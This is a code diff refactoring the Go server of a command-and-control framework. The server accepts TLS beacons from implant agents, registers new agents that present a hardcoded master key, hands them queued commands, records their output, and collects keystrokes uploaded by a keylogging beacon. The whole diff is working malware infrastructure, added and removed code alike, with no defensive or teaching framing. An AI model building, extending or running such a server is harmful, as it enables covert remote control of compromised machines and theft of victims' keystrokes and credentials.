@@ -4,8 +4,6 @@ import (
 	"bufio"
 	"crypto/tls"
 	"encoding/gob"
-	"fmt"
-	"io"
 	"log"
 	"net"
 	"os"
@@ -18,163 +16,12 @@ import (
 	"github.com/google/uuid"
 )
 
-//make it central
-func IsValidUUID(u string) bool {
-	_, err := uuid.Parse(u)
-	return err == nil
-}
-
-func handleconn(connection net.Conn) {
-	for {
-		text, err := bufio.NewReader(connection).ReadString('\n')
-		if err != nil {
-			if err == io.EOF {
-				logger.Logf(logger.Info, "Connection closed by client\n")
-			} else {
-				logger.Logf(logger.Error, "Error reading from connection: %v\n", err)
-			}
-			break
-		}
-		message := strings.Split(text, "\n")
-		// fmt.Println(message[0])
-		if message[0] != "" {
-			// slpit message
-			glob := strings.Split(message[0], ":")
-			// fmt.Println(glob)
-			if len(glob) == 11 {
-				uid := glob[0]
-				user := glob[1]
-				hostname := glob[2]
-				ip := glob[3]
-				keyOrNot := glob[5] // because of unfiltered hostname adding port
-				AgentServerIP := glob[6]
-				AgentServerPort := glob[7]
-				AgentFreq := glob[8]
-				AgentJitter := glob[9]
-				masterkey := glob[10]
-				if IsValidUUID(uid) {
-
-					// search uuid in database using received uuid
-					fetch, err := data.FetchOneAgent(uid)                  // first pass agent check
-					if err != nil {
-						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
-					}
-					if fetch.Uuid == "" && masterkey == "MASTERKEY" { //prob check its a uuid and master key                // future fix (accepts all uuid) reason: to allow server create agent record in db
-						//parse IP, hostname and user from agent
-						data.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
-						data.CreateKeys( uid)
-					}
-					fetch, err = data.FetchOneAgent( uid) // second pass agent check
-					if err != nil {
-						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
-					}
-					logger.Logf(logger.Info, "Agent %s Fetched for validation\n", fetch.Uuid)
-					if uid == fetch.Uuid {
-						// Handle command response
-						if keyOrNot == "NoKeysBeacon" {
-
-							logger.Logf(logger.Info, "Agent %s Connected\n", uid)
-							encoder := gob.NewEncoder(connection)
-							instruct := data.FetchNextCommand( fetch.Uuid)
-							logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
-							if err := encoder.Encode(instruct); err != nil {
-								log.Fatalln(err)
-							}
-							destruct := &types.GiveServerResult{}
-							dec := gob.NewDecoder(connection)
-							dec.Decode(destruct)
-
-							if destruct.Result == "2" {
-								logger.Logf(logger.Debug, "Agent %s Sent Nothing Back\n", uid)
-								connection.Close()
-							} else {
-								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
-								data.UpdateAgentCommand( destruct.CommandUUID, destruct.Output, fetch.Uuid)
-								if destruct.Output == "~Killed~" {
-									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
-									connection.Close()
-								}
-								connection.Close()
-							}
-							now := time.Now()
-							data.UpdateAgentCheckIn( uid, now.Unix())
-						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
-
-							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
-							encoder := gob.NewEncoder(connection)
-							instruct := &types.KeySend{Uuid: uid}
-							logger.Logf(logger.Info, "Key Send %s \n", instruct.Uuid)
-							if err := encoder.Encode(instruct); err != nil {
-								log.Fatalln(err)
-							}
-							destruct := &types.KeyReceive{}
-							dec := gob.NewDecoder(connection)
-							dec.Decode(destruct)
-
-							if destruct.Keys != "" {
-								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
-								data.UpdateAgentKeys( uid, destruct.Keys)
-								connection.Close()
-							} else {
-								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
-								connection.Close()
-							}
-							now := time.Now()
-							data.UpdateAgentCheckIn( uid, now.Unix())
-						} else {
-							logger.Logf(logger.Info, "Unknown Beacon Type\n")
-							connection.Close()
-						}
-					} else {
-						// agent not in database!!!
-						logger.Logf(logger.Info, "Unknown Agent, Wrong Key\n")
-						connection.Close()
-					}
-				} else {
-					logger.Logf(logger.Info, "Invalid UUID\n")
-					connection.Close()
-				}
-			} else {
-				logger.Logf(logger.Info, "Wrong blob count\n")
-				connection.Close()
-			}
-		}
-	}
-
-}
-
 func main() {
-	// Enable or disable logging based on a condition
-	enableLogging := true
-	logger.EnableLogging(enableLogging)
-
-	// Set the log file
-	logFileName := "logs/server.log"
-	err := logger.SetLogFile(logFileName)
-	if err != nil {
-		fmt.Printf("Error setting log file: %v\n", err)
-		return
-	}
-
-	c2serverip := os.Getenv("C2SERVER_IP")
-	c2serverport := os.Getenv("C2SERVER_PORT")
-
-	data.OpenDatabase()
-	data.InitDatabase()
-
-	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
-	if err != nil {
-		log.Fatal(err)
-	}
-	config := &tls.Config{Certificates: []tls.Certificate{cer}}
-	listener, err := tls.Listen("tcp", c2serverip+":"+c2serverport, config)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	// Update Agent status ricker
-	ticker := time.Tick(300 * time.Second) //could possibly cause a deadlock
-
+	initializeServer()
+	listener := createListener()
 	defer listener.Close()
+
+	ticker := time.Tick(300 * time.Second)
 	for {
 		select {
 		case <-ticker:
@@ -182,11 +29,166 @@ func main() {
 		default:
 			connection, err := listener.Accept()
 			if err != nil {
-				log.
-					Fatalln(err)
+				logger.Logf(logger.Error, "Error accepting connection: %v\n", err)
 			}
-			go handleconn(connection)
+			go handleConnection(connection)
 		}
-
 	}
+}
+
+func initializeServer() {
+	enableLogging := true
+	logger.EnableLogging(enableLogging)
+	err := logger.SetLogFile("logs/server.log")
+	if err != nil {
+		log.Fatalf("Error setting log file: %v\n", err)
+	}
+
+	data.OpenDatabase()
+	data.InitDatabase()
+}
+
+func createListener() (net.Listener) {
+	c2serverip := os.Getenv("C2SERVER_IP")
+	c2serverport := os.Getenv("C2SERVER_PORT")
+
+	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
+	if err != nil {
+		log.Fatalf("Error loading certificate: %v\n", err)
+	}
+	config := &tls.Config{Certificates: []tls.Certificate{cer}}
+
+	listener, err := tls.Listen("tcp", c2serverip+":"+c2serverport, config)
+	if err != nil {
+		log.Fatalf("Error starting listener: %v\n", err)
+	}
+
+	return listener
+}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+	text, _ := bufio.NewReader(conn).ReadString('\n')
+	messageParts := strings.Split(text, "\n")
+	if len(messageParts) > 0 && messageParts[0] != "" {
+		processMessage(conn, messageParts[0])
+	}
+}
+
+func processMessage(conn net.Conn, message string) {
+	parts := strings.Split(message, ":")
+	if len(parts) != 11 {
+		logger.Logf(logger.Info, "Invalid message format\n")
+		return
+	}
+
+	uid := parts[0]
+	if !isValidUUID(uid) {
+		logger.Logf(logger.Info, "Invalid UUID\n")
+		return
+	}
+
+	user, hostname, ip := parts[1], parts[2], parts[3]
+	beaconType := parts[5]
+	agentServerIP, agentServerPort := parts[6], parts[7]
+	frequency, jitter := parts[8], parts[9]
+	masterkey := parts[10]
+
+	agentExists := validateOrCreateAgent(uid, masterkey, agentServerIP, agentServerPort, frequency, jitter, ip, user, hostname)
+	if !agentExists {
+		logger.Logf(logger.Info, "Unknown agent or invalid key\n")
+		return
+	}
+
+	switch beaconType {
+	case "NoKeysBeacon":
+		handleCommandResponse(conn, uid)
+	case "KeysBeacon":
+		handleKeyLogResponse(conn, uid)
+	default:
+		logger.Logf(logger.Info, "Unknown beacon type\n")
+	}
+}
+
+func isValidUUID(u string) bool {
+	_, err := uuid.Parse(u)
+	return err == nil
+}
+
+func validateOrCreateAgent(uid, masterkey, serverIP, serverPort, freq, jitter, ip, user, hostname string) bool {
+	fetch, err := data.FetchOneAgent(uid)
+	if err != nil {
+		logger.Logf(logger.Warning, "Couldn't fetch agent: %v\n", err)
+		return false
+	}
+
+	if fetch.Uuid == "" && masterkey == "MASTERKEY" {
+		data.CreateAgent(uid, serverIP+":"+serverPort, freq, jitter, ip, user, hostname)
+		data.CreateKeys(uid)
+		fetch, err = data.FetchOneAgent(uid)
+		if err != nil {
+			logger.Logf(logger.Warning, "Couldn't fetch agent after creation: %v\n", err)
+			return false
+		}
+	}
+
+	return fetch.Uuid == uid
+}
+
+func handleCommandResponse(conn net.Conn, uid string) {
+	logger.Logf(logger.Info, "Agent %s connected for command response\n", uid)
+
+	encoder := gob.NewEncoder(conn)
+	instruct := data.FetchNextCommand(uid)
+	if err := encoder.Encode(instruct); err != nil {
+		logger.Logf(logger.Error, "Failed to send command: %v\n", err)
+		return
+	}
+
+	destruct := &types.GiveServerResult{}
+	decoder := gob.NewDecoder(conn)
+	logger.Logf(logger.Debug, "Destruct: %v \n", destruct)
+	if err := decoder.Decode(destruct); err != nil {
+		logger.Logf(logger.Error, "Failed to decode response: %v\n", err)
+		return
+	}
+
+	if destruct.Result == "2" {
+		logger.Logf(logger.Debug, "Agent %s sent no response\n", uid)
+	} else {
+		logger.Logf(logger.Debug, "Agent %s responded: %s\n", uid, destruct.Output)
+		data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, uid)
+	}
+
+	if destruct.Output == "~Killed~" {
+		logger.Logf(logger.Warning, "Agent %s terminated\n", uid)
+	}
+
+	data.UpdateAgentCheckIn(uid, time.Now().Unix())
+}
+
+func handleKeyLogResponse(conn net.Conn, uid string) {
+	logger.Logf(logger.Info, "Agent %s connected for key log response\n", uid)
+
+	encoder := gob.NewEncoder(conn)
+	if err := encoder.Encode(&types.KeySend{Uuid: uid}); err != nil {
+		logger.Logf(logger.Error, "Failed to send key request: %v\n", err)
+		return
+	}
+
+	destruct := &types.KeyReceive{}
+	decoder := gob.NewDecoder(conn)
+	if err := decoder.Decode(destruct); err != nil {
+		logger.Logf(logger.Error, "Failed to decode key log response: %v\n", err)
+		return
+	}
+
+	if destruct.Keys != "" {
+		logger.Logf(logger.Debug, "Agent %s sent keys: %s\n", uid, destruct.Keys)
+		data.UpdateAgentKeys(uid, destruct.Keys)
+	} else {
+		logger.Logf(logger.Debug, "Agent %s sent no keys\n", uid)
+	}
+
+	data.UpdateAgentCheckIn(uid, time.Now().Unix())
 }
